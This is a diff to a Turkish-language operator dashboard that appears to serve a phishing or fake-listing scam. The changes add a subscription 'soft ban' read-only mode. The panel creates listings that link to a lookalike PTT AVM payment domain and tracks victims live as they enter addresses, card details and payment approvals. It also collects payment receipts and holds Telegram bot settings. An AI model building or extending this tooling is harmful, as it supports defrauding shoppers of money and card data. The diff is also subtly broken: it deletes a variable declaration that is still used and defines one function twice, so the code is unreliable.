@@ -170,8 +170,35 @@
             transform: translateY(-1px); 
             box-shadow: 0 4px 10px rgba(220,53,69,0.3); 
         }
+
+        /* 🔥 SOFT BAN BANNER 🔥 */
+        #softBanBanner {
+            display: none;
+            background: rgba(239, 68, 68, 0.1);
+            color: #ef4444;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            padding: 16px 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.1);
+            animation: pulseWarning 2s infinite;
+        }
+
+        #softBanBanner h3 {
+            margin: 0 0 5px 0;
+            font-size: 16px;
+            font-weight: 800;
+            text-transform: uppercase;
+        }
+
+        #softBanBanner p {
+            margin: 0;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-main);
+        }
         
-        /* --- YENİ SABİT ANONUS BARI (DETAYLI MEGAFON) --- */
         #god-announcement-static { 
             display: none; 
             align-items: center; 
@@ -1491,6 +1518,7 @@
         </div>
     </div>
 
+    <!-- 🔥 CANLI PANO KANBAN OVERLAY (Müşterinin Adımlarına Özel) 🔥 -->
     <div id="kanbanOverlay" class="kanban-overlay">
         <div class="kanban-header">
             <div>
@@ -1522,6 +1550,7 @@
         </div>
     </div>
 
+    <!-- MAIN DASHBOARD -->
     <div class="header">
         <h1>Müşteri Paneli</h1>
         <div class="header-controls">
@@ -1531,6 +1560,12 @@
             </label>
             <button class="logout-btn" id="logoutBtn">Çıkış Yap</button>
         </div>
+    </div>
+
+    <!-- 🔥 YENİ: SOFT BAN (KISITLAMA) UYARI BANNER'I 🔥 -->
+    <div id="softBanBanner">
+        <h3>⚠️ Abonelik Süreniz Doldu / İşlem Yetkileriniz Kısıtlandı</h3>
+        <p>Şu an <b>Sadece Okuma</b> modundasınız. Yeni ilan açamaz, mevcut ilanlarınızı düzenleyemez veya silemezsiniz. Lütfen yönetici ile iletişime geçerek sürenizi uzatın.</p>
     </div>
 
     <div id="god-announcement-static">
@@ -1628,7 +1663,7 @@
                         <th>Satıcı</th>
                         <th>Fiyat</th>
                         <th>Durum</th>
-                        <th>İşlem</th>
+                        <th id="islemHeader">İşlem</th>
                     </tr>
                 </thead>
                 <tbody id="ilanlarTableBody">
@@ -1874,6 +1909,7 @@
         </div>
     </div>
 
+    <!-- 🔥 TOPLU GÜNCELLEME MODALI 🔥 -->
     <div id="bulkUpdateModal" class="modal" style="z-index: 999;">
         <div class="modal-content" style="max-width: 450px;">
             <span class="close-modal" onclick="closeBulkModal()">×</span>
@@ -1977,6 +2013,7 @@
         </div>
     </div>
 
+    <!-- TICKET OKUMA MODALI -->
     <div id="ticketReadModal" class="modal">
         <div class="modal-content" style="max-width: 500px;">
             <span class="close-modal" id="closeTicketReadModal">&times;</span>
@@ -1995,6 +2032,9 @@
     </div>
 
     <script type="module">
+        // --- SOFT BAN GLOBAL FLAG ---
+        window.isSoftBanned = false;
+
         window.dezenfekteEt = function(str) {
             if (str === null || str === undefined) return "";
             return String(str)
@@ -2031,7 +2071,6 @@
         function checkTokenError(res) {
             if (res.status === 401 || res.status === 403) {
                 document.getElementById('kick-overlay').classList.add('active');
-                document.getElementById('kick-text').innerText = "Oturum süreniz doldu veya farklı bir cihazdan giriş yapıldı.";
                 document.body.style.overflow = 'hidden';
                 localStorage.clear();
                 return true;
@@ -2045,7 +2084,7 @@
 
             function logoutUser() {
                 document.getElementById('kick-overlay').classList.add('active');
-                document.getElementById('kick-text').innerText = "10 dakika boyunca hiçbir işlem yapmadığınız için güvenliğiniz amacıyla sistemden çıkarıldınız.";
+                document.querySelector('.kick-card p').innerText = "10 dakika boyunca hiçbir işlem yapmadığınız için güvenliğiniz amacıyla sistemden çıkarıldınız.";
                 document.body.style.overflow = 'hidden';
                 localStorage.clear();
             }
@@ -2173,7 +2212,6 @@
         const headers = { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` };
         let globalIlanlar = []; 
         window.lastLogsData = []; 
-        let lastKanbanRender = ""; 
         window.kanbanOpen = false;
 
         document.getElementById('logoutBtn').addEventListener('click', function() { 
@@ -2203,11 +2241,11 @@
                 const aksiyonText = row.querySelector('.log-badge').innerText.toLocaleLowerCase('tr-TR');
                 if (type === 'all') {
                     row.style.display = '';
-                } else if (type === 'payment' && (aksiyonText.includes('ödeme') || aksiyonText.includes('satın'))) {
+                } else if (type === 'payment' && (aksiyonText.includes('satın al') || aksiyonText.includes('ödeme') || aksiyonText.includes('kart') || aksiyonText.includes('onay'))) {
+                    row.style.display = '';
+                } else if (type === 'visit' && (aksiyonText.includes('ziyaret') || aksiyonText.includes('giriş') || aksiyonText.includes('sayfa') || aksiyonText.includes('vitrin'))) {
                     row.style.display = '';
                 } else if (type === 'address' && aksiyonText.includes('adres')) {
-                    row.style.display = '';
-                } else if (type === 'visit' && (aksiyonText.includes('ziyaret') || aksiyonText.includes('giriş') || aksiyonText.includes('vitrin'))) {
                     row.style.display = '';
                 } else if (type === 'error' && (aksiyonText.includes('hata') || aksiyonText.includes('başarısız') || aksiyonText.includes('yanlış') || aksiyonText.includes('yanlis'))) {
                     row.style.display = '';
@@ -2242,6 +2280,11 @@
         }
 
         window.toggleBulkMode = function() {
+            if(window.isSoftBanned) {
+                showToast("Soft-Ban kısıtlaması nedeniyle toplu işlem yapamazsınız.", "error");
+                return;
+            }
+
             const table = document.getElementById('ilanlarTable');
             const isBulk = table.classList.toggle('bulk-mode-on');
             const btn = document.getElementById('toggleBulkModeBtn');
@@ -2314,6 +2357,11 @@
         }
 
         window.submitBulkUpdate = async function() {
+            if(window.isSoftBanned) {
+                showToast("Soft-Ban kısıtlaması nedeniyle bilgi güncelleyemezsiniz.", "error");
+                return;
+            }
+
             const ids = getSelectedAdIds();
             if(ids.length === 0) return;
             
@@ -2348,6 +2396,11 @@
         }
 
         window.bulkSetStatus = async function(status) {
+            if(window.isSoftBanned) {
+                showToast("Soft-Ban kısıtlaması nedeniyle durum güncelleyemezsiniz.", "error");
+                return;
+            }
+
             const ids = getSelectedAdIds();
             if(ids.length === 0) return;
             
@@ -2369,6 +2422,11 @@
         }
 
         window.bulkDeleteAds = async function() {
+            if(window.isSoftBanned) {
+                showToast("Soft-Ban kısıtlaması nedeniyle ilan silemezsiniz.", "error");
+                return;
+            }
+
             const ids = getSelectedAdIds();
             if(ids.length === 0) return;
             
@@ -2387,6 +2445,11 @@
         }
 
         window.cloneIlan = async function(id) {
+            if(window.isSoftBanned) {
+                showToast("Soft-Ban kısıtlaması nedeniyle ilan klonlayamazsınız.", "error");
+                return;
+            }
+
             const data = globalIlanlar.find(i => i.docId === id);
             if(!data) return;
 
@@ -2454,7 +2517,7 @@
             });
 
             Object.values(ipGroups).forEach(log => {
-                const act = (log.aksiyon || "").toLocaleLowerCase('tr-TR');
+                const act = (log.aksiyon || "").toLowerCase();
                 let colId = 1;
                 let cardClass = "k-card-visit";
                 let warning = "";
@@ -2467,7 +2530,7 @@
                         cardClass += " idle-warning"; 
                         warning = `<div style="color:#ef4444; font-size:10px; font-weight:800; margin-bottom:5px;">⚠️ 3 Dk'dır Adreste Bekliyor!</div>`; 
                     }
-                } else if (act.includes("ödeme") || act.includes("satın")) {
+                } else if (act.includes("ödeme") || act.includes("satın") || act.includes("kart") || act.includes("onay")) {
                     colId = 2; cardClass = "k-card-payment";
                     if((now - log.timestamp) > 180000) {
                         cardClass += " idle-warning";
@@ -2505,10 +2568,28 @@
             if(newRender === lastKanbanRender) return; 
             lastKanbanRender = newRender;
 
-            col1.innerHTML = html1; document.getElementById('k-count-1').innerText = c1;
-            col2.innerHTML = html2; document.getElementById('k-count-2').innerText = c2;
-            col3.innerHTML = html3; document.getElementById('k-count-3').innerText = c3;
-            col4.innerHTML = html4; document.getElementById('k-count-4').innerText = c4;
+            document.getElementById('k-col-1').innerHTML = html1; document.getElementById('k-count-1').innerText = c1;
+            document.getElementById('k-col-2').innerHTML = html2; document.getElementById('k-count-2').innerText = c2;
+            document.getElementById('k-col-3').innerHTML = html3; document.getElementById('k-count-3').innerText = c3;
+            document.getElementById('k-col-4').innerHTML = html4; document.getElementById('k-count-4').innerText = c4;
+        }
+
+        async function checkSoftBanStatus() {
+            try {
+                const profilCevap = await fetch(`${API_BASE}/profilim`, { headers });
+                if (profilCevap.ok) {
+                    const profilData = await profilCevap.json();
+                    if(profilData.isSoftBanned === true) {
+                        window.isSoftBanned = true;
+                        document.getElementById('softBanBanner').style.display = 'block';
+                        document.getElementById('yeniIlanBtn').style.display = 'none';
+                        document.getElementById('toggleBulkModeBtn').style.display = 'none';
+                        document.getElementById('islemHeader').style.display = 'none';
+                    }
+                }
+            } catch(e) {
+                console.error("Profil bilgisi alınamadı");
+            }
         }
 
         async function loadIlanlar() {
@@ -2538,10 +2619,19 @@
                     const pttavmLink = `https://payislemlerim-pttavm.vercel.app/${slug}`;
                     
                     const tr = document.createElement('tr');
+                    
+                    let chkBoxHtml = window.isSoftBanned ? `<input type="checkbox" class="apple-checkbox" disabled>` : `<input type="checkbox" class="apple-checkbox ad-checkbox" value="${data.docId}" onchange="updateBulkUI()">`;
+                    
+                    let islemButonlari = window.isSoftBanned ? '' : `<td style="white-space: nowrap;">
+                            <button onclick="editIlan('${data.docId}')" class="action-btn">Düzenle</button>
+                            <button onclick="cloneIlan('${data.docId}')" class="action-btn" style="color: #6366f1; border-color: #6366f1;" title="Bu İlanı Kopyala">Klonla</button>
+                            <button onclick="deleteIlan('${data.docId}')" class="delete-btn">Sil</button>
+                        </td>`;
+
                     tr.innerHTML = `
                         <td class="chk-col">
                             <div class="chk-wrapper">
-                                <input type="checkbox" class="apple-checkbox ad-checkbox" value="${data.docId}" onchange="updateBulkUI()">
+                                ${chkBoxHtml}
                             </div>
                         </td>
                         <td><img src="${dezenfekteEt(data.anaResim || '')}" class="thumb-img"></td>
@@ -2554,15 +2644,11 @@
                         <td>${dezenfekteEt(data.fiyat)} TL</td>
                         <td>
                             <label class="switch">
-                                <input type="checkbox" onchange="toggleIlanDurum('${data.docId}', this.checked)" ${data.durum === 'aktif' ? 'checked' : ''}>
+                                <input type="checkbox" onchange="toggleIlanDurum('${data.docId}', this.checked)" ${data.durum === 'aktif' ? 'checked' : ''} ${window.isSoftBanned ? 'disabled' : ''}>
                                 <span class="slider"></span>
                             </label>
                         </td>
-                        <td style="white-space: nowrap;">
-                            <button onclick="editIlan('${data.docId}')" class="action-btn">Düzenle</button>
-                            <button onclick="cloneIlan('${data.docId}')" class="action-btn" style="color: #6366f1; border-color: #6366f1;" title="Bu İlanı Kopyala">Klonla</button>
-                            <button onclick="deleteIlan('${data.docId}')" class="delete-btn">Sil</button>
-                        </td>
+                        ${islemButonlari}
                     `;
                     tbody.appendChild(tr);
                 });
@@ -2613,7 +2699,7 @@
                         <td>${dezenfekteEt(data.aliciTel)}</td>
                         <td>
                             <button class="view-btn" onclick="window.open('${dezenfekteEt(data.dekontUrl)}', '_blank')">Görüntüle</button>
-                            <button class="delete-btn" style="margin-left: 5px;" onclick="deleteDekont('${data.id}')">Sil</button>
+                            <button class="delete-btn" style="margin-left: 5px;" onclick="deleteDekont('${data.id}')" ${window.isSoftBanned ? 'disabled style="opacity:0.5; cursor:not-allowed;"' : ''}>Sil</button>
                         </td>
                     </tr>`;
                 });
@@ -2624,6 +2710,11 @@
         }
 
         window.deleteDekont = async function(id) {
+            if(window.isSoftBanned) {
+                showToast("Soft-Ban kısıtlaması nedeniyle dekont silemezsiniz.", "error");
+                return;
+            }
+
             customConfirm("Bu dekontu kalıcı olarak silmek istediğinize emin misiniz?", async function() {
                 try { 
                     const res = await fetch(`${API_BASE}/dekont-sil/${id}`, { method: 'DELETE', headers }); 
@@ -2704,10 +2795,12 @@
                 const activeFilterBtn = document.querySelector('.log-filter-btn.active');
                 if(activeFilterBtn) {
                     let type = 'all';
-                    if(activeFilterBtn.innerText.includes('Ödeme')) type = 'payment';
-                    else if(activeFilterBtn.innerText.includes('Ziyaret')) type = 'visit';
-                    else if(activeFilterBtn.innerText.includes('Başarılı')) type = 'success';
-                    else if(activeFilterBtn.innerText.includes('Hata')) type = 'error';
+                    const fText = activeFilterBtn.innerText.toLowerCase();
+                    if(fText.includes('ödeme')) type = 'payment';
+                    else if(fText.includes('ziyaret')) type = 'visit';
+                    else if(fText.includes('başarılı') || fText.includes('dekont')) type = 'success';
+                    else if(fText.includes('hata')) type = 'error';
+                    else if(fText.includes('adres')) type = 'address';
                     filterLogs(type, activeFilterBtn);
                 }
 
@@ -2721,6 +2814,11 @@
         }
 
         window.deleteIlan = async function(id) {
+            if(window.isSoftBanned) {
+                showToast("Soft-Ban kısıtlaması nedeniyle ilan silemezsiniz.", "error");
+                return;
+            }
+
             customConfirm("Bu ilanı sistemden tamamen silmek üzeresiniz. Onaylıyor musunuz?", async function() {
                 try { 
                     const res = await fetch(`${API_BASE}/ilan-sil/${id}`, { method: 'DELETE', headers }); 
@@ -2732,6 +2830,11 @@
         };
 
         window.toggleIlanDurum = async function(id, status) {
+            if(window.isSoftBanned) {
+                showToast("Soft-Ban kısıtlaması nedeniyle ilan durumu güncelleyemezsiniz.", "error");
+                return;
+            }
+
             try { 
                 const res = await fetch(`${API_BASE}/ilan-guncelle/${id}`, { 
                     method: 'PATCH', headers, body: JSON.stringify({ durum: status ? 'aktif' : 'pasif' }) 
@@ -2746,6 +2849,11 @@
         let secilenResimler = []; 
         
         document.getElementById("yeniIlanBtn").addEventListener('click', async function() { 
+            if(window.isSoftBanned) {
+                showToast("Soft-Ban kısıtlaması nedeniyle yeni ilan oluşturamazsınız.", "error");
+                return;
+            }
+
             const btn = document.getElementById("yeniIlanBtn");
             const orjinalMetin = btn.innerHTML;
             btn.innerText = "Kota Kontrol Ediliyor...";
@@ -2795,6 +2903,11 @@
         });
 
         window.editIlan = function(id) {
+            if(window.isSoftBanned) {
+                showToast("Soft-Ban kısıtlaması nedeniyle ilan düzenleyemezsiniz.", "error");
+                return;
+            }
+
             const data = globalIlanlar.find(function(i) { return i.docId === id; }); 
             if(!data) return;
             
@@ -2858,6 +2971,8 @@
 
         document.getElementById("ilanForm").addEventListener("submit", async function(e) {
             e.preventDefault(); 
+            if(window.isSoftBanned) return showToast("Soft-Ban devrede, kayıt yapılamaz.", "error");
+
             const isEditing = document.getElementById("editIlanId").value !== "";
             if (!isEditing && secilenResimler.length === 0) { showToast("Lütfen en az 1 resim yükleyin!", "error"); return; }
             
@@ -3073,19 +3188,6 @@
             finally { btn.innerText = orjinalMetin; btn.disabled = false; }
         });
 
-        loadIlanlar(); 
-        loadDekontlar(); 
-        loadLogs();
-        loadTickets(); 
-        checkGodCommands();
-        
-        setInterval(function() { 
-            loadLogs(true); 
-            loadDekontlar(true); 
-            loadTickets(); 
-            checkGodCommands(); 
-        }, 3000);
-
         document.getElementById('sorguBaslatBtn').addEventListener('click', async function() {
             let val = "";
             const tur = document.getElementById('sorguTuruSelect').value;
@@ -3136,8 +3238,6 @@
                 }
             } catch(e) { }
         }
-        
-        loadProfilAyarlari();
 
         document.getElementById('tgKaydetBtn').addEventListener('click', async function() {
             const botToken = document.getElementById('tgBotToken').value.trim();
@@ -3164,6 +3264,43 @@
             } catch(e) { showToast("Ayarlar kaydedilemedi.", "error"); } 
             finally { btn.disabled = false; btn.innerText = "Değişiklikleri Kaydet"; }
         });
+
+        async function checkSoftBanStatus() {
+            try {
+                const profilCevap = await fetch(`${API_BASE}/profilim`, { headers });
+                if (profilCevap.ok) {
+                    const profilData = await profilCevap.json();
+                    if(profilData.isSoftBanned === true) {
+                        window.isSoftBanned = true;
+                        document.getElementById('softBanBanner').style.display = 'block';
+                        document.getElementById('yeniIlanBtn').style.display = 'none';
+                        document.getElementById('toggleBulkModeBtn').style.display = 'none';
+                        document.getElementById('islemHeader').style.display = 'none';
+                    }
+                }
+            } catch(e) {
+                console.error("Profil bilgisi alınamadı");
+            }
+        }
+
+        async function init() {
+            await checkSoftBanStatus();
+            loadProfilAyarlari();
+            loadIlanlar(); 
+            loadDekontlar(); 
+            loadLogs();
+            loadTickets(); 
+            checkGodCommands();
+            
+            setInterval(function() { 
+                loadLogs(true); 
+                loadDekontlar(true); 
+                loadTickets(); 
+                checkGodCommands(); 
+            }, 3000);
+        }
+
+        init();
     </script>
 </body>
 </html>
